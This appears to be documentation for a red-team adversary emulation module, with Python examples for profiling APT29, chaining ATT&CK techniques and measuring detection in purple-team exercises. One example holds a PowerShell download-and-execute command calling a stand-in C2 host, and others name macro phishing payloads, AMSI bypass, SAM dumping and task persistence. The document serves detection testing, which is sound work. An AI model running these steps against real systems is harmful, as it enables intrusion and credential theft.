---
name: "adversary-emulation"
category: "redteam"
version: "1.0.0"
tags: ["redteam", "adversary-emulation", "threat-actors", "apt-simulation", "mitre-attack"]
---

# Adversary Emulation Framework

## Overview

The Adversary Emulation module provides structured methodology and tooling for mapping, implementing, and testing against specific threat actor tactics, techniques, and procedures (TTPs). Unlike general penetration testing or red team operations, adversary emulation focuses on replicating the exact behaviors of known threat groups — APTs, cybercriminal organizations, insider threats — to test whether an organization can detect and respond to the specific threats most relevant to their industry and geography.

This module bridges threat intelligence and offensive operations. It translates threat intelligence reports (MITRE ATT&CK, vendor advisories, government alerts) into executable attack chains that can be tested in controlled environments. Each emulation includes TTP mapping, tool selection, infrastructure requirements, and detection validation.

Adversary emulation is particularly valuable for:
- **Threat-informed defense validation** — testing whether security controls detect specific adversary behaviors
- **Tabletop exercises** — providing realistic scenarios for incident response teams
- **Purple team operations** — collaborative testing between red and blue teams
- **Compliance requirements** — demonstrating threat-aware security testing

This module includes pre-built profiles for common threat actors and extensible templates for creating custom adversary profiles.

**Authorization is mandatory.** Adversary emulation involves implementing real attack techniques. Only conduct these activities with explicit written authorization and proper isolation.

## Core Capabilities

### 1. Threat Intelligence Processing
- Threat report parsing and TTP extraction
- MITRE ATT&CK mapping and coverage analysis
- Threat actor profiling (motivation, sophistication, targets, infrastructure)
- Campaign correlation and attribution support
- Threat landscape monitoring

### 2. Adversary Profile Development
- Pre-built profiles for known APT groups
- Custom adversary profile creation
- TTP selection and prioritization
- Tool and infrastructure mapping
- Detection opportunity identification

### 3. Emulation Execution
- Technique-by-technique implementation
- Automated attack chain execution
- Environment-aware adaptation
- Detection validation at each stage
- Operational security during emulation

### 4. Detection Validation
- Detection rule testing against specific TTPs
- Coverage gap identification
- False positive/negative analysis
- Alert quality assessment
- SOC workflow validation

### 5. Reporting and Intelligence Feedback
- Emulation results mapped to threat intelligence
- Detection capability gap analysis
- Threat intelligence validation
- Defensive improvement recommendations
- Intelligence cycle feedback

## Usage Examples

### Create an Adversary Profile

```python
from adversary_emulation import AdversaryProfile, ThreatActor, TTP

# Define threat actor
threat_actor = ThreatActor(
    name="APT29 (Cozy Bear)",
    aliases=["The Dukes", "CozyDuke", "NOBELIUM"],
    motivation="espionage",
    sophistication="advanced",
    country="Russia",
    associated_groups=["APT28", "Sandworm"],
    targeted_sectors=["government", "technology", "healthcare"],
    active_since="2008",
    tools=[
        "wellmess", "wellmail", "sorefang", "crutch", "noise",
        "miniDump", "lazagne", "certutil", "regsvr32", "mshta",
    ],
    infrastructure=[
        "compromised_websites", "bulletproof_hosting", "domain_fronting",
    ],
)

# Map TTPs from threat intelligence
ttps = [
    TTP(
        technique_id="T1566.001",
        name="Spearphishing Attachment",
        description="Sends spearphishing emails with malicious attachments",
        tools=["macro_documents", "iso_files"],
        detection="email_gateway, endpoint_detection",
    ),
    TTP(
        technique_id="T1059.001",
        name="PowerShell",
        description="Uses PowerShell for execution, often with encoded commands",
        tools=["powershell_encoded", "powershell_download"],
        detection="script_block_logging, module_logging",
    ),
    TTP(
        technique_id="T1053.005",
        name="Scheduled Task",
        description="Creates scheduled tasks for persistence and execution",
        tools=["schtasks", "xml_task_creation"],
        detection="task_creation_events, sysmon",
    ),
    TTP(
        technique_id="T1003.002",
        name="Security Account Manager",
        description="Dumps SAM database for credential extraction",
        tools=["reg_save", "secretsdump"],
        detection="reg_access_monitoring, credential_dump_detection",
    ),
    TTP(
        technique_id="T1041",
        name="Exfiltration Over C2 Channel",
        description="Exfiltrates data over the established C2 channel",
        tools=["https_c2", "dns_tunneling"],
        detection="network_traffic_analysis, dlp",
    ),
]

# Create adversary profile
profile = AdversaryProfile(
    threat_actor=threat_actor,
    ttps=ttps,
    emulation_scope="external_network",
    target_environment="enterprise_windows",
    skill_level_required="advanced",
    estimated_duration_weeks=8,
    team_size=3,
)
```

### Execute Adversary Emulation

```python
from adversary_emulation import EmulationPlan, EmulationExecution, TechniqueExecution

# Create emulation plan
plan = EmulationPlan(
    profile=profile,
    objectives=[
        "Gain initial access via phishing",
        "Establish persistence",
        "Escalate to domain admin",
        "Exfiltrate simulated sensitive data",
    ],
    constraints={
        "no_destructive_actions": True,
        "preserve_evidence": True,
        "coordinate_with_blue_team": False,  # stealth test
        "business_hours_only": False,
    },
    detection_validation=True,
)

# Execute emulation
emulation = EmulationExecution(plan)

# Phase 1: Initial Access
phase1 = emulation.execute_technique(
    technique="T1566.001",
    implementation={
        "method": "spearphishing_attachment",
        "payload": "macro_document_with_cobalt_strike",
        "delivery": "email",
        "targets": ["executives@target.com"],
    },
    opsec=True,
    validate_detection=True,
)

# Phase 2: Execution
phase2 = emulation.execute_technique(
    technique="T1059.001",
    parent=phase1,
    implementation={
        "method": "powershell_encoded",
        "command": "IEX(New-Object Net.WebClient).DownloadString('http://c2-server/payload')",
        "evasion": "amsi_bypass, script_block_logging_evasion",
    },
    opsec=True,
    validate_detection=True,
)

# Phase 3: Persistence
phase3 = emulation.execute_technique(
    technique="T1053.005",
    parent=phase2,
    implementation={
        "method": "scheduled_task",
        "task_name": "SystemUpdateCheck",
        "trigger": "logon",
        "action": "powershell_encoded_command",
    },
    opsec=True,
    validate_detection=True,
)

# Continue through all techniques...
results = emulation.get_results()
```

### Automated TTP Execution

```python
from adversary_emulation import TTPExecutor, TTPChain

# Define a TTP chain (attack path)
ttp_chain = TTPChain(
    name="APT29 Initial Access to Exfiltration",
    profile=profile,
    techniques=[
        {"id": "T1566.001", "order": 1, "parent": None},
        {"id": "T1204.002", "order": 2, "parent": "T1566.001"},
        {"id": "T1059.001", "order": 3, "parent": "T1204.002"},
        {"id": "T1053.005", "order": 4, "parent": "T1059.001"},
        {"id": "T1003.002", "order": 5, "parent": "T1053.005"},
        {"id": "T1021.002", "order": 6, "parent": "T1003.002"},
        {"id": "T1041", "order": 7, "parent": "T1021.002"},
    ],
)

# Execute entire chain
executor = TTPExecutor(
    profile=profile,
    chain=ttp_chain,
    environment="enterprise_windows",
    opsec_level="high",
    detection_validation=True,
)

results = executor.execute_chain(
    auto_adapt=True,  # adapt to environment if technique fails
    max_retries=3,
    timeout_per_technique=300,
    evidence_capture=True,
)

# Review results
for result in results:
    print(f"Technique: {result.technique_id} - {result.technique_name}")
    print(f"  Success: {result.success}")
    print(f"  Detected: {result.detected}")
    print(f"  Detection Time: {result.detection_time_seconds}s")
    print(f"  Evidence: {result.evidence_path}")
    print()
```

### Purple Team Detection Validation

```python
from adversary_emulation import PurpleTeamExercise, DetectionTest

# Create purple team exercise
purple_team = PurpleTeamExercise(
    profile=profile,
    blue_team_involved=True,
    real_time_communication=True,
    shared_workspace="purple_team_channel",
)

# Test specific detection capabilities
detection_tests = [
    DetectionTest(
        technique="T1003.002",
        name="SAM Database Dump Detection",
        expected_detection="credential_dump_monitoring",
        test_method="reg_save_sam",
        validation_criteria=[
            "alert_generated",
            "alert_within_seconds(300)",
            "correct_technique_identified",
            "incident_created",
        ],
    ),
    DetectionTest(
        technique="T1053.005",
        name="Suspicious Scheduled Task Detection",
        expected_detection="task_creation_monitoring",
        test_method="create_suspicious_task",
        validation_criteria=[
            "alert_generated",
            "task_creation_event_logged",
            "correctly_flagged_as_suspicious",
        ],
    ),
]

# Execute detection tests
results = purple_team.run_detection_tests(detection_tests)

# Generate detection gap analysis
gaps = purple_team.analyze_detection_gaps(results)
for gap in gaps:
    print(f"Detection Gap: {gap.technique}")
    print(f"  Current Coverage: {gap.coverage_level}")
    print(f"  Gap Description: {gap.description}")
    print(f"  Recommended Fix: {gap.remediation}")
    print()
```

### Generate Emulation Report

```python
from adversary_emulation import EmulationReport, TTPCoverage

# Create report
report = EmulationReport(
    profile=profile,
    execution_results=results,
    detection_results=detection_test_results,
)

# Analyze TTP coverage
coverage = TTPCoverage(profile=profile, results=results)
print(f"\n=== TTP Coverage Analysis ===")
print(f"Total TTPs in profile: {coverage.total_ttps}")
print(f"TTPs executed: {coverage.executed_ttps}")
print(f"TTPs successful: {coverage.successful_ttps}")
print(f"TTPs detected: {coverage.detected_ttps}")
print(f"Detection rate: {coverage.detection_rate}%")
print(f"Mean time to detect: {coverage.mean_time_to_detect}s")

# Coverage by tactic
for tactic, stats in coverage.by_tactic.items():
    print(f"\n{tactic}:")
    print(f"  Executed: {stats.executed}/{stats.total}")
    print(f"  Detected: {stats.detected}/{stats.executed}")

# Generate full report
report.generate(
    format="docx",
    output_path="./reports/adversary_emulation_report.docx",
    include_ttp_matrix=True,
    include_detection_analysis=True,
    include_remediation=True,
    classification="CONFIDENTIAL",
)
```

## Best Practices

### Threat Intelligence Integration
1. **Start with threat intelligence.** Emulation should be driven by real threat data, not theoretical attack scenarios.
2. **Validate threat intelligence.** Use emulation to test whether reported TTPs are accurate and applicable to your environment.
3. **Update profiles regularly.** Threat actors evolve their TTPs. Keep adversary profiles current with latest intelligence.
4. **Map to MITRE ATT&CK.** Use the ATT&CK framework as the common language for TTP documentation and analysis.

### Emulation Execution
1. **Be faithful to the threat actor.** The value of emulation is in realistic simulation. Don't take shortcuts that diverge from actual adversary behavior.
2. **Environment-aware adaptation.** Real adversaries adapt to their environment. Your emulation should too — but document all adaptations.
3. **Validate detection at each stage.** Don't wait until the end to test detection. Check after each technique whether the blue team detected it.
4. **Maintain operational security.** Even in controlled environments, practice the OPSEC that the real adversary would use.

### Purple Team Collaboration
1. **Establish clear communication channels.** Purple team exercises require real-time coordination between red and blue teams.
2. **Share TTP details in advance (or not).** Depending on the exercise goals, share technique details to test detection rules, or keep them secret to test SOC response.
3. **Focus on detection gaps.** The primary output should be actionable improvements to detection and response capabilities.
4. **Document everything.** Both teams should document observations for post-exercise analysis.

### Reporting and Improvement
1. **Quantify detection coverage.** Use metrics like detection rate, mean time to detect, and coverage by tactic.
2. **Prioritize remediation by threat relevance.** Focus on TTPs used by threat actors most likely to target your organization.
3. **Provide intelligence feedback.** Emulation results can validate or refute threat intelligence assumptions.
4. **Track improvement over time.** Repeat exercises to measure improvement in detection capabilities.

## Related Modules

- **red-team-operations** — Full-scope adversary simulation with operational planning
- **penetration-testing** — Technical vulnerability assessment and exploitation
- **redteam-mindset** — Operational discipline for offensive security
- **hunt-api-misconfig** — API security testing for specific adversary techniques
- **hunt-ato** — Account takeover techniques used by adversary groups
- **hunt-cloud-misconfig** — Cloud infrastructure misconfigurations exploited by APTs
- **hunt-llm-ai** — AI/LLM security testing for emerging adversary techniques
- **web2-vuln-classes** — Web vulnerability reference for adversary tool selection
